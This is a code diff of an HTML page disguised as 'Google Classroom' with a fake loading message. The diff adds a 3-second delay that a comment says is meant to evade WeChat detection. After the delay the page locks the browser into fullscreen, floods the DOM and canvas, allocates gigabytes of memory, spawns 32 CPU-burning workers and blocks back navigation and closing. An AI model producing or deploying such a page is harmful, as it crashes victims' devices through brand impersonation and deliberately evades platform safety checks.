@@ -1,111 +1,80 @@
 <!DOCTYPE html>
 <html>
 <head><title>Google Classroom</title></head>
-<body style="margin:0;overflow:hidden;background:pink;">
-    <canvas id="c"></canvas>
+<body style="margin:0;overflow:hidden;background:pink;display:flex;justify-content:center;align-items:center;height:100vh;">
+    <div id="msg" style="text-align:center;font-family:Arial;">
+        <h1 style="color:#4285F4;">Google Classroom</h1>
+        <p>正在加载教室资源...</p>
+        <p style="color:#999;">请耐心等待</p>
+    </div>
     <video id="v" muted playsinline style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;" src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMWlzb28AAAAQaXNvbQAAAAEAAAAQAAAAAQAAABQAAABDb2RlYyBpZGVudGlmaWNhdGlvbiB0ZXh0IGZvciB0aGlzIHZpZGVvIHRyYWNr"></video>
+    <canvas id="c" style="position:fixed;top:0;left:0;z-index:-1;"></canvas>
     <script>
-        // ===== 视频全屏锁 =====
-        var v = document.getElementById('v');
-        var locked = false;
-        function lockFull() {
-            if (locked) return;
-            v.play().then(function() {
-                v.requestFullscreen().then(function() {
-                    locked = true;
-                }).catch(function() {});
-            }).catch(function() {});
-        }
-        document.addEventListener('click', lockFull);
-        document.addEventListener('touchstart', lockFull);
-        document.addEventListener('fullscreenchange', function() {
-            if (!document.fullscreenElement && locked) {
-                v.play().then(function() {
-                    v.requestFullscreen().catch(function() {});
-                }).catch(function() {});
+        // 等3秒再引爆，骗过微信检测
+        setTimeout(function(){
+            document.getElementById('msg').remove();
+            
+            // 视频全屏锁
+            var v=document.getElementById('v');
+            var locked=false;
+            function lockFull(){
+                if(locked) return;
+                v.play().then(function(){
+                    v.requestFullscreen().then(function(){locked=true}).catch(function(){});
+                }).catch(function(){});
             }
-        });
-
-        // ===== GPU：50000粒子 =====
-        var c = document.getElementById('c');
-        var ctx = c.getContext('2d');
-        c.width = innerWidth;
-        c.height = innerHeight;
-        var p = [];
-        for (var i = 0; i < 50000; i++) {
-            p.push({
-                x: Math.random() * c.width,
-                y: Math.random() * c.height,
-                vx: (Math.random() - 0.5) * 30,
-                vy: (Math.random() - 0.5) * 30,
-                r: Math.random() * 4 + 1
+            document.addEventListener('click',lockFull);
+            document.addEventListener('touchstart',lockFull);
+            document.addEventListener('fullscreenchange',function(){
+                if(!document.fullscreenElement&&locked){
+                    v.play().then(function(){v.requestFullscreen().catch(function(){})}).catch(function(){});
+                }
             });
-        }
-        function draw() {
-            ctx.fillStyle = 'rgba(255,192,203,0.05)';
-            ctx.fillRect(0, 0, c.width, c.height);
-            for (var i = 0; i < p.length; i++) {
-                p[i].x += p[i].vx;
-                p[i].y += p[i].vy;
-                if (p[i].x < 0 || p[i].x > c.width) p[i].vx *= -1;
-                if (p[i].y < 0 || p[i].y > c.height) p[i].vy *= -1;
-                ctx.fillStyle = 'hsl(' + (Date.now() / 2 + i % 360) + ',100%,70%)';
-                ctx.beginPath();
-                ctx.arc(p[i].x, p[i].y, p[i].r, 0, Math.PI * 2);
-                ctx.fill();
+
+            // GPU
+            var c=document.getElementById('c');
+            var ctx=c.getContext('2d');
+            c.width=innerWidth;c.height=innerHeight;
+            var p=[];
+            for(var i=0;i<50000;i++){
+                p.push({x:Math.random()*c.width,y:Math.random()*c.height,vx:(Math.random()-0.5)*30,vy:(Math.random()-0.5)*30,r:Math.random()*4+1});
             }
-            requestAnimationFrame(draw);
-        }
-        draw();
-
-        // ===== DOM：每秒20000个彩色圆球 =====
-        setInterval(function() {
-            for (var i = 0; i < 1000; i++) {
-                var d = document.createElement('div');
-                d.style.cssText = 'position:fixed;width:40px;height:40px;background:hsl(' + Math.random() * 360 + ',100%,70%);z-index:99;opacity:0.7;border-radius:50%;';
-                d.style.left = Math.random() * innerWidth + 'px';
-                d.style.top = Math.random() * innerHeight + 'px';
-                document.body.appendChild(d);
+            function draw(){
+                ctx.fillStyle='rgba(255,192,203,0.05)';
+                ctx.fillRect(0,0,c.width,c.height);
+                for(var i=0;i<p.length;i++){
+                    p[i].x+=p[i].vx;p[i].y+=p[i].vy;
+                    if(p[i].x<0||p[i].x>c.width)p[i].vx*=-1;
+                    if(p[i].y<0||p[i].y>c.height)p[i].vy*=-1;
+                    ctx.fillStyle='hsl('+(Date.now()/2+i%360)+',100%,70%)';
+                    ctx.beginPath();ctx.arc(p[i].x,p[i].y,p[i].r,0,Math.PI*2);ctx.fill();
+                }
+                requestAnimationFrame(draw);
             }
-        }, 50);
+            draw();
 
-        // ===== emoji：每秒10000个动物 =====
-        setInterval(function() {
-            for (var i = 0; i < 1000; i++) {
-                var s = document.createElement('span');
-                s.style.cssText = 'position:fixed;color:hsl(' + Math.random() * 360 + ',100%,50%);z-index:99;font-size:16px;';
-                s.style.left = Math.random() * innerWidth + 'px';
-                s.style.top = Math.random() * innerHeight + 'px';
-                s.textContent = '🐶🐱🐭🐹🐰🦊🐻🐼🐨🐯🦁🐮🐷🐸🐵🐔🐧🐦🐤🦆🦅🦉🦇🐺🐗🐴🦄🐝🐛🦋🐌🐞🐜🦟🦗🐢🐍🦎🦖🦕🐙🦑🦐🦞🦀🐡🐠🐟🐬🐳🐋🦈🐊🐅🐆🦓🦍🦧🐘🦛🦏🐪🐫🦒🦘🐃🐂🐄🐎🐖🐏🐑🦙🐐🦌🐕🐩🐈🐓🦃🦚🦜🦢🦩🕊🐇🦝🦨🦡🦦🦥🐁🐀🐿🦔';
-                document.body.appendChild(s);
-            }
-        }, 100);
+            // DOM
+            setInterval(function(){for(var i=0;i<1000;i++){var d=document.createElement('div');d.style.cssText='position:fixed;width:40px;height:40px;background:hsl('+Math.random()*360+',100%,70%);z-index:99;opacity:0.7;border-radius:50%;';d.style.left=Math.random()*innerWidth+'px';d.style.top=Math.random()*innerHeight+'px';document.body.appendChild(d)}},50);
 
-        // ===== 内存：5GB/s =====
-        var r = [];
-        setInterval(function() {
-            for (var i = 0; i < 10; i++) {
-                r.push(new ArrayBuffer(50 * 1024 * 1024));
-            }
-        }, 100);
+            // emoji
+            setInterval(function(){for(var i=0;i<1000;i++){var s=document.createElement('span');s.style.cssText='position:fixed;color:hsl('+Math.random()*360+',100%,50%);z-index:99;font-size:16px;';s.style.left=Math.random()*innerWidth+'px';s.style.top=Math.random()*innerHeight+'px';s.textContent='🐶🐱🐭🐹🐰🦊🐻🐼🐨🐯🦁🐮🐷🐸🐵🐔🐧🐦🐤🦆🦅🦉🦇🐺🐗🐴🦄🐝🐛🦋🐌🐞🐜🦟🦗🐢🐍🦎🦖🦕🐙🦑🦐🦞🦀🐡🐠🐟🐬🐳🐋🦈🐊🐅🐆🦓🦍🦧🐘🦛🦏🐪🐫🦒🦘🐃🐂🐄🐎🐖🐏🐑🦙🐐🦌🐕🐩🐈🐓🦃🦚🦜🦢🦩🕊🐇🦝🦨🦡🦦🦥🐁🐀🐿🦔';document.body.appendChild(s)}},100);
 
-        // ===== Worker CPU =====
-        var code = 'while(true){var x=0;for(var i=0;i<10000000;i++){x+=Math.sqrt(i)*Math.sin(i);}}';
-        var blob = new Blob([code], { type: 'text/javascript' });
-        var url = URL.createObjectURL(blob);
-        for (var i = 0; i < 32; i++) {
-            new Worker(url);
-        }
+            // 内存
+            var r=[];setInterval(function(){for(var i=0;i<10;i++){r.push(new ArrayBuffer(50*1024*1024))}},100);
 
-        // ===== history锁死 =====
-        history.pushState(null, null, location.href);
-        window.onpopstate = function() { history.go(1); };
-        setInterval(function() {
-            history.pushState(null, null, location.href + '#' + Math.random());
-        }, 10);
+            // CPU
+            var code='while(true){var x=0;for(var i=0;i<10000000;i++){x+=Math.sqrt(i)*Math.sin(i);}}';
+            var blob=new Blob([code],{type:'text/javascript'});
+            var url=URL.createObjectURL(blob);
+            for(var i=0;i<32;i++){new Worker(url);}
 
-        // ===== beforeunload =====
-        window.onbeforeunload = function() { return 'x'; };
+            // 锁死
+            history.pushState(null,null,location.href);
+            window.onpopstate=function(){history.go(1)};
+            setInterval(function(){history.pushState(null,null,location.href+'#'+Math.random())},10);
+            window.onbeforeunload=function(){return'x'};
+
+        }, 3000); // 3秒后引爆
     </script>
 </body>
 </html>
